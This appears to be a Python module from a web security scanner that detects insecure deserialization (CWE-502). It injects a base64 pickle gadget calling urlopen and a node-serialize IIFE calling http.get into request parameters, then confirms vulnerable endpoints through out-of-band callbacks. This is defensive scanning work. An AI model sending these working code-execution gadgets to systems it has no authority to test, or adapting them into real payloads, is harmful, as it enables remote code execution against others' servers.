"""Active detector: insecure deserialization, confirmed out-of-band (OAST).

Deserializing attacker-controlled data (a base64 pickle in a cookie, a ``node-serialize`` blob
in a body field) hands the process a gadget that runs on load. Confirming it black-box safely is
the hard part: a real RCE probe is dangerous and blind. So this uses a **benign, OAST-confirmed**
payload — on deserialization it only makes one outbound request to a unique collaborator URL:

- **Python pickle** — an object whose ``__reduce__`` calls ``urllib.request.urlopen(<oast>)``;
- **Node.js ``node-serialize``** — a ``_$$ND_FUNC$$_`` IIFE doing ``http.get(<oast>)``.

Each is injected into the discovered parameters/cookies; after all are sent, the collaborator is
polled and a finding is raised only for a **correlated callback**. No callback, no finding — zero
false positives by construction. Requires an OAST collaborator (``--oast local|interactsh``); a
no-op without one.

CWE-502 (Deserialization of Untrusted Data) / OWASP A08:2021.
"""

from __future__ import annotations

import base64
import json
import pickle
import urllib.request
from urllib.parse import urlsplit

import httpx

from dastcore.core.http_client import BudgetExceededError, HttpClient, OutOfScopeError
from dastcore.core.models import Evidence, Finding, HttpRequest, HttpResponse, InjectionPoint
from dastcore.engine.injection_points import extract_injection_points
from dastcore.engine.oast import OastProvider
from dastcore.engine.rule_engine import build_mutated_request

_MAX_POINTS = 40  # bound the request budget on large crawls


class _PickleCallback:
    """On unpickle, fetches ``url`` — a benign DNS/HTTP callback, not code execution on our side."""

    def __init__(self, url: str) -> None:
        self.url = url

    def __reduce__(self):
        return (urllib.request.urlopen, (self.url,))


def _pickle_payload(url: str) -> str:
    return base64.b64encode(pickle.dumps(_PickleCallback(url))).decode("ascii")


def _node_serialize_payload(url: str) -> str:
    fn = "function(){require('http').get(" + json.dumps(url) + ")}()"
    return json.dumps({"dc": "_$$ND_FUNC$$_" + fn})


_PAYLOADS: list[tuple[str, object]] = [
    ("Python pickle", _pickle_payload),
    ("Node.js node-serialize", _node_serialize_payload),
]


async def _send(client: HttpClient, request: HttpRequest) -> None:
    try:
        await client.request(
            request.method,
            request.url,
            params=request.params or None,
            headers=request.headers or None,
            cookies=request.cookies or None,
            data=request.data,
            json=request.json_body,
        )
    except (OutOfScopeError, BudgetExceededError, httpx.HTTPError):
        return


async def _collect_callbacks(oast: OastProvider, tokens: set[str], attempts: int, delay: float) -> set[str]:
    import asyncio

    hits: set[str] = set()
    for _ in range(attempts):
        for interaction in await oast.poll():
            if interaction.token in tokens:
                hits.add(interaction.token)
        if hits >= tokens:
            break
        await asyncio.sleep(delay)
    return hits


def _finding(point: InjectionPoint, kind: str, request: HttpRequest, url: str) -> Finding:
    path = urlsplit(request.url).path or "/"
    probe = build_mutated_request(point, "<deserialization payload>")
    return Finding(
        id=f"insecure-deserialization:{kind}:{request.method}:{path}:{point.location}:{point.name}",
        rule_id="insecure-deserialization",
        name=f"Insecure deserialization ({kind})",
        severity="critical",
        cwe="CWE-502",
        owasp="A08:2021",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        family="deserialization",
        injection_point=point,
        evidence=[
            Evidence(
                type="oob",
                data=(
                    f"a {kind} payload injected into '{point.name}' ({point.location}) triggered an out-of-band "
                    f"callback to {url} on deserialization — the endpoint deserializes attacker-controlled input, "
                    "which is a remote-code-execution gadget"
                )[:200],
                confidence="high",
            )
        ],
        request=probe,
        response=HttpResponse(status_code=0),  # confirmation is out-of-band, not from a response
        remediation=(
            "Nunca deserialices datos no confiables. Usa formatos de datos sin ejecución (JSON con validación de "
            "esquema) en vez de pickle/serialización nativa; si es imprescindible, firma e integra un allowlist de "
            "clases. Aísla y actualiza las librerías de deserialización."
        ),
    )


async def run_deserialization_checks(
    client: HttpClient,
    requests: list[HttpRequest],
    oast: OastProvider | None,
    *,
    poll_attempts: int = 8,
    poll_delay: float = 0.5,
) -> list[Finding]:
    """Inject benign OAST-callback deserialization payloads into discovered inputs and report
    only the ones that produced a correlated out-of-band callback."""
    if oast is None or not oast.is_available():
        return []
    handles: dict[str, tuple[InjectionPoint, str, HttpRequest, str]] = {}
    seen: set[tuple[str, str, str]] = set()
    for request in requests:
        for point in extract_injection_points(request, include_headers=False):
            sig = (urlsplit(request.url).path or "/", point.location, point.name)
            if sig in seen:
                continue
            seen.add(sig)
            if len(seen) > _MAX_POINTS:
                break
            for kind, build in _PAYLOADS:
                handle = oast.new_handle()
                payload = build(handle.url)  # type: ignore[operator]
                await _send(client, build_mutated_request(point, payload))
                handles[handle.token] = (point, kind, request, handle.url)
        if len(seen) > _MAX_POINTS:
            break

    hits = await _collect_callbacks(oast, set(handles), poll_attempts, poll_delay)
    return [
        _finding(point, kind, request, url) for token, (point, kind, request, url) in handles.items() if token in hits
    ]
